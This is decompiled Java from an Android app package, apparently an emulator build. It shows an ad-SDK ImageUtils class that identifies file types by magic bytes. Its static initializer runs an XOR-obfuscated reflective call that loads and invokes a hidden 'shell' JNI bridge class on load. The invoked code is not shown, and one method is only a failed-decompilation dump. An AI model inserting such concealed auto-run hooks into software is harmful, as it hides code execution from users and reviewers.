package com.czhj.sdk.common.utils;

import android.graphics.Bitmap;
import com.baidu.mobads.sdk.internal.a;
import com.fl.saas.common.util.FileTypeUtils;
import com.kuaishou.weapon.p0.t;
import java.lang.reflect.Method;
import java.util.HashMap;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public class ImageUtils {

    /* renamed from: a, reason: collision with root package name */
    private static final HashMap<String, String> f10603a;

    static {
        HashMap<String, String> hashMap = new HashMap<>();
        f10603a = hashMap;
        hashMap.put("FFD8FF", FileTypeUtils.FILE_TYPE_JPEG);
        hashMap.put("89504E47", FileTypeUtils.FILE_TYPE_PNG);
        hashMap.put("47494638", "gif");
        hashMap.put("49492A00", "tif");
        hashMap.put("424D", FileTypeUtils.FILE_TYPE_BMP);
        hashMap.put("41433130", "dwg");
        hashMap.put("38425053", "psd");
        hashMap.put("7B5C727466", "rtf");
        hashMap.put("3C3F786D6C", "xml");
        hashMap.put("68746D6C3E", a.f);
        hashMap.put("44656C69766572792D646174653A", "eml");
        hashMap.put("D0CF11E0", "doc");
        hashMap.put("5374616E64617264204A", "mdb");
        hashMap.put("252150532D41646F6265", "ps");
        hashMap.put("255044462D312E", "pdf");
        hashMap.put("504B0304", "docx");
        hashMap.put("52617221", "rar");
        hashMap.put("57415645", FileTypeUtils.FILE_TYPE_WAV);
        hashMap.put("41564920", "avi");
        hashMap.put("2E524D46", t.w);
        hashMap.put("000001BA", "mpg");
        hashMap.put("000001B3", "mpg");
        hashMap.put("6D6F6F76", "mov");
        hashMap.put("3026B2758E66CF11", "asf");
        hashMap.put("4D546864", "mid");
        hashMap.put("1F8B08", "gz");
        hashMap.put("4D5A9000", "exe/dll");
        hashMap.put("75736167", "txt");
        mExbd();
    }

    /* JADX WARN: Code restructure failed: missing block: B:15:0x0019, code lost:
    
        if (r1 == null) goto L12;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private static java.lang.String a(java.lang.String r4) {
        /*
            r0 = 0
            java.io.FileInputStream r1 = new java.io.FileInputStream     // Catch: java.lang.Throwable -> L17
            r1.<init>(r4)     // Catch: java.lang.Throwable -> L17
            r4 = 4
            byte[] r2 = new byte[r4]     // Catch: java.lang.Throwable -> L15
            r3 = 0
            r1.read(r2, r3, r4)     // Catch: java.lang.Throwable -> L15
            java.lang.String r0 = a(r2)     // Catch: java.lang.Throwable -> L15
        L11:
            r1.close()     // Catch: java.lang.Throwable -> L1c
            goto L1c
        L15:
            goto L19
        L17:
            r1 = r0
        L19:
            if (r1 == 0) goto L1c
            goto L11
        L1c:
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.czhj.sdk.common.utils.ImageUtils.a(java.lang.String):java.lang.String");
    }

    public static String getFileType(String str) {
        return f10603a.get(a(str));
    }

    private static /* synthetic */ void mExbd() {
        char[] charArray = "MAC\u0000IOCK\u0000LAW\u0000]FKBB\u0000d@Gl\\GJIK".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ '.');
        }
        String str = new String(charArray);
        char[] charArray2 = "MBG@GZ".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ '.');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    public static void recycleBitmap(Bitmap bitmap) {
        if (bitmap == null || bitmap.isRecycled()) {
            return;
        }
        bitmap.recycle();
    }

    private static String a(byte[] bArr) {
        StringBuilder sb = new StringBuilder();
        if (bArr == null || bArr.length <= 0) {
            return null;
        }
        for (byte b : bArr) {
            String upperCase = Integer.toHexString(b & 255).toUpperCase();
            if (upperCase.length() < 2) {
                sb.append(0);
            }
            sb.append(upperCase);
        }
        return sb.toString();
    }
}
